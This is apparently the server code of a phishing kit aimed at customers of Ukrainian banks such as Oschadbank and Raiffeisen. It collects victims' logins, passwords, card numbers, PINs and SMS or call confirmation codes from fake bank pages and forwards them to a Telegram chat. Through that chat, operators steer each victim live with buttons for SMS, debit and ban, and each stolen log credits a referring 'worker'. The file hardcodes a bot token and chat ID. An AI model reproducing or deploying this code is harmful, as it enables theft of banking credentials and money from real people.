const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// --- –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ---
const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969';
// --- –ö–û–ù–ï–¶ –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–ò ---

// –î–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ URL –¥–ª—è Render
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;

// –°–ø–∏—Å–æ–∫ –±–∞–Ω–∫–æ–≤ –¥–ª—è –∫–Ω–æ–ø–∫–∏ "–ó–ê–ü–†–û–°"
const banksForRequestButton = [
    '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω', '–ê–ª—å—è–Ω—Å', '–ü–£–ú–ë', 'OTP Bank',
    '–í–æ—Å—Ç–æ–∫', 'Izibank', '–£–∫—Ä—Å–∏–±'
];

const app = express();
app.use(express.json());
app.use(cors());

// --- –û–°–ù–û–í–ù–´–ï –ú–ê–†–®–†–£–¢–´ ---
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});
app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });
app.get('/panel', (req, res) => { res.sendFile(path.join(__dirname, 'panel.html')); });

// --- –ù–ê–°–¢–†–û–ô–ö–ê TELEGRAM –ë–û–¢–ê ---
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

if (WEBHOOK_URL) {
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`Webhook —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ ${WEBHOOK_URL}`))
        .catch(err => console.error('–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤–µ–±—Ö—É–∫–∞:', err));
    bot.sendMessage(CHAT_ID, '‚úÖ –°–ï–†–í–ï–† –ü–ï–†–ï–ó–ê–ü–£–©–ï–ù! –ù–æ–≤–∞—è –ª–æ–≥–∏–∫–∞ Oschadbank –∞–∫—Ç–∏–≤–Ω–∞.', { parse_mode: 'HTML' }).catch(console.error);
} else {
    console.error('–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: –Ω–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å RENDER_EXTERNAL_URL. –í–µ–±—Ö—É–∫ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.');
}

bot.getMe().then(me => console.log(`–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω: @${me.username}`)).catch(err => console.error('–û—à–∏–±–∫–∞ –±–æ—Ç–∞:', err));

app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// --- –ù–ê–°–¢–†–û–ô–ö–ê WEBSOCKET ---
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('–ö–ª–∏–µ–Ω—Ç –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è –ø–æ WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`–ö–ª–∏–µ–Ω—Ç –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω: ${data.sessionId}`);
            }
        } catch (e) { console.error('–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ WebSocket —Å–æ–æ–±—â–µ–Ω–∏—è:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`–ö–ª–∏–µ–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('–û—à–∏–±–∫–∞ WebSocket:', error));
});

// --- –û–ë–†–ê–ë–û–¢–ö–ê –ö–û–ú–ê–ù–î –ò–ó TELEGRAM ---
bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);

    if (!ws || ws.readyState !== WebSocket.OPEN) {
        bot.answerCallbackQuery(callbackQuery.id, { text: '‚ùóÔ∏è–û—à–∏–±–∫–∞: –∫–ª–∏–µ–Ω—Ç –Ω–µ –≤ —Å–µ—Ç–∏!', show_alert: true });
        return;
    }

    const sessionData = sessions.get(sessionId) || {};
    let command = { type: type, data: {} };

    switch (type) {
        case 'lk':
        case 'call':
            break; // No extra data needed
        case 'telegram_debit':
            break; // No extra data needed for this command
        case 'password_error':
            // –û–ø—Ä–µ–¥–µ–ª—è–µ–º, –∫–∞–∫–æ–π —Ç–∏–ø –≤—Ö–æ–¥–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª –∫–ª–∏–µ–Ω—Ç (–ª–æ–≥–∏–Ω –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω)
            command.data = { loginType: sessionData.loginMethod || 'phone' };
            break;
        case 'code_error':
        case 'other':
        case 'ban':
            break; // Standard commands
        
        // --- –ö–æ–º–∞–Ω–¥—ã –¥–ª—è —Å—Ç–∞—Ä—ã—Ö –ø–æ—Ç–æ–∫–æ–≤ (–Ω–µ –û—â–∞–¥) ---
        case 'sms':
            command.data = { text: "–í–∞–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ SMS –∑ –∫–æ–¥–æ–º..." };
            break;
        case 'request_details':
            command.data = { isRaiffeisen: sessionData.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω' };
            break;
            
        default:
            bot.answerCallbackQuery(callbackQuery.id, { text: `–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞: ${type}` });
            return;
    }

    ws.send(JSON.stringify(command));
    bot.answerCallbackQuery(callbackQuery.id, { text: `–ö–æ–º–∞–Ω–¥–∞ "${type}" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!` });
});


// --- –û–°–ù–û–í–ù–û–ô –û–ë–†–ê–ë–û–¢–ß–ò–ö –î–ê–ù–ù–´–• –û–¢ –ö–õ–ò–ï–ù–¢–ê ---
app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
    
    // –ü–æ–ª—É—á–∞–µ–º –Ω–∏–∫ –≤–æ—Ä–∫–µ—Ä–∞
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) { /* ignore */ }
    
    // –û–±–Ω–æ–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ —Å–µ—Å—Å–∏–∏
    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData, workerNick };
    sessions.set(sessionId, newData);
    
    let message = '';
    let sendLog = false;

    // 1. –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–¥–∞ —Å–æ –∑–≤–æ–Ω–∫–∞ (–û—â–∞–¥–±–∞–Ω–∫)
    if (newData.call_code) {
        message = `<b>üìû –ö–æ–¥ —Å–æ –∑–≤–æ–Ω–∫–∞ (–û—â–∞–¥)</b>\n\n`;
        message += `<b>–ö–æ–¥:</b> <code>${newData.call_code}</code>\n`;
        // –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –±–µ—Ä–µ–º –∏–∑ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤—Ö–æ–¥–∞ –∏–ª–∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
        const phone = newData.phone || newData.fp_phone || '–Ω–µ —É–∫–∞–∑–∞–Ω';
        message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${phone}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ message: 'OK' });
        return;
    }

    // 2. –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ SMS-–∫–æ–¥–∞ —Å–ø–∏—Å–∞–Ω–∏—è (–û—â–∞–¥–±–∞–Ω–∫)
    if (newData.sms_code) {
        message = `<b>üí∏ –ö–æ–¥ —Å–ø–∏—Å–∞–Ω–∏—è (–û—â–∞–¥)</b>\n\n`;
        message += `<b>–ö–æ–¥:</b> <code>${newData.sms_code}</code>\n`;
        const phone = newData.phone || newData.fp_phone || '–Ω–µ —É–∫–∞–∑–∞–Ω';
        message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${phone}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ message: 'OK' });
        return;
    }

    // 3. –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ—Å–ª–µ –≤–≤–æ–¥–∞ –ª–æ–≥–∏–Ω–∞/–ø–∞—Ä–æ–ª—è –∏–ª–∏ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è (–û—â–∞–¥–±–∞–Ω–∫)
    if (newData.bankName === '–û—â–∞–¥–±–∞–Ω–∫' && !newData.logSent) {
        // 3.1. –í—Ö–æ–¥ –ø–æ –ª–æ–≥–∏–Ω—É –∏ –ø–∞—Ä–æ–ª—é
        if (newData.login && newData.password) {
            message = `<b>üè¶ –í—Ö–æ–¥ –≤ –û—â–∞–¥ (–õ–æ–≥–∏–Ω)</b>\n\n`;
            message += `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n`;
            message += `<b>–õ–æ–≥–∏–Ω:</b> <code>${newData.login}</code>\n`;
            message += `<b>–ü–∞—Ä–æ–ª—å:</b> <code>${newData.password}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            sendLog = true;
        } 
        // 3.2. –í—Ö–æ–¥ –ø–æ —Ç–µ–ª–µ—Ñ–æ–Ω—É –∏ –ø–∞—Ä–æ–ª—é
        else if (newData.phone && newData.password) {
            message = `<b>üè¶ –í—Ö–æ–¥ –≤ –û—â–∞–¥ (–¢–µ–ª–µ—Ñ–æ–Ω)</b>\n\n`;
            message += `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n`;
            message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</b> <code>${newData.phone}</code>\n`;
            message += `<b>–ü–∞—Ä–æ–ª—å:</b> <code>${newData.password}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            sendLog = true;
        }
        // 3.3. –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è (–æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ—Å–ª–µ –≤–≤–æ–¥–∞ –ü–ò–ù-–∫–æ–¥–∞)
        else if (newData.fp_pin && newData.fp_card && newData.fp_phone) {
            message = `<b>üîß –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ (–û—â–∞–¥)</b>\n\n`;
            message += `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n`;
            message += `<b>–ú–æ–±–∏–ª—å–Ω—ã–π:</b> <code>${newData.fp_phone}</code>\n`;
            message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${newData.fp_card}</code>\n`;
            message += `<b>–ü–∏–Ω:</b> <code>${newData.fp_pin}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            sendLog = true;
        }
    } 
    // 4. –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –≤—Å–µ—Ö –æ—Å—Ç–∞–ª—å–Ω—ã—Ö –±–∞–Ω–∫–æ–≤ (—Å—Ç–∞—Ä–∞—è –ª–æ–≥–∏–∫–∞)
    else if (isFinalStep && !newData.logSent) {
        message = `<b>üí≥ –ù–æ–≤—ã–π –ª–æ–≥ (–î—Ä—É–≥–æ–π –±–∞–Ω–∫)</b>\n\n`;
        message += `<b>–ù–∞–∑–≤–∞–Ω–∏–µ –±–∞–Ω–∫–∞:</b> ${newData.bankName}\n`;
        if (newData.phone) message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${newData.phone}</code>\n`;
        if (newData.card) message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∏:</b> <code>${newData.card}</code>\n`;
        if (newData.pin) message += `<b>–ü—ñ–Ω:</b> <code>${newData.pin}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        sendLog = true;
    }

    if (sendLog) {
        newData.logSent = true; // –°—Ç–∞–≤–∏–º —Ñ–ª–∞–≥, —á—Ç–æ–±—ã –Ω–µ –¥—É–±–ª–∏—Ä–æ–≤–∞—Ç—å –ª–æ–≥
        sessions.set(sessionId, newData);
        sendToTelegram(message, sessionId, newData.bankName);
    }
    
    res.status(200).json({ message: 'OK' });
});

// –û–ë–†–ê–ë–û–¢–ö–ê SMS –¥–ª—è —Å—Ç–∞—Ä—ã—Ö –ø–æ—Ç–æ–∫–æ–≤ (–Ω–µ –û—â–∞–¥)
app.post('/api/sms', (req, res) => {
    const { sessionId, code, referrer } = req.body;
    let workerNick = 'unknown';
    try { if (referrer && referrer !== 'unknown') workerNick = atob(referrer); } catch (e) {}

    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>üí¨ –ü–æ–ª—É—á–µ–Ω–æ SMS (—Å—Ç–∞—Ä—ã–π –ø–æ—Ç–æ–∫)</b>\n\n`;
        message += `<b>–ö–æ–¥:</b> <code>${code}</code>\n`;
        if(sessionData.phone) message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>–°–µ—Å—Å–∏—è:</b> <code>${sessionId}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});


// --- –§–£–ù–ö–¶–ò–Ø –û–¢–ü–†–ê–í–ö–ò –°–û–û–ë–©–ï–ù–ò–Ø –í TELEGRAM –° –ö–ù–û–ü–ö–ê–ú–ò ---
function sendToTelegram(message, sessionId, bankName) {
    let keyboard = [];

    // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –±–∞–Ω–∫–∞
    if (bankName === '–û—â–∞–¥–±–∞–Ω–∫') {
        keyboard = [
            [{ text: 'üì± –õ–ö', callback_data: `lk:${sessionId}` }, { text: 'üìû –ó–≤–æ–Ω–æ–∫', callback_data: `call:${sessionId}` }, { text: 'üí∏ –°–ø–∏—Å–∞–Ω–∏–µ', callback_data: `telegram_debit:${sessionId}` }],
            [{ text: '‚ùå–ü–∞—Ä–æ–ª—å', callback_data: `password_error:${sessionId}` }, { text: '‚ùå–ö–æ–¥', callback_data: `code_error:${sessionId}` }, { text: '‚ùìOTHER', callback_data: `other:${sessionId}` }],
            [{ text: 'üö´ BAN', callback_data: `ban:${sessionId}` }]
        ];
    } else {
        // –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è –¥—Ä—É–≥–∏—Ö –±–∞–Ω–∫–æ–≤
        keyboard = [
            [{ text: 'üí¨ SMS', callback_data: `sms:${sessionId}` }, { text: '‚ùìOTHER', callback_data: `other:${sessionId}` }],
            [{ text: 'üö´ BAN', callback_data: `ban:${sessionId}` }]
        ];
        // –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É –ó–ê–ü–†–û–°, –µ—Å–ª–∏ –±–∞–Ω–∫ –≤ —Å–ø–∏—Å–∫–µ
        if (banksForRequestButton.includes(bankName)) {
            keyboard[0].push({ text: 'üìã –ó–ê–ü–†–û–°', callback_data: `request_details:${sessionId}` });
        }
    }
    
    bot.sendMessage(CHAT_ID, message, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard }
    }).catch(err => console.error("Telegram send error:", err));
}

// --- –ó–ê–ü–£–°–ö –°–ï–†–í–ï–†–ê ---
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`));

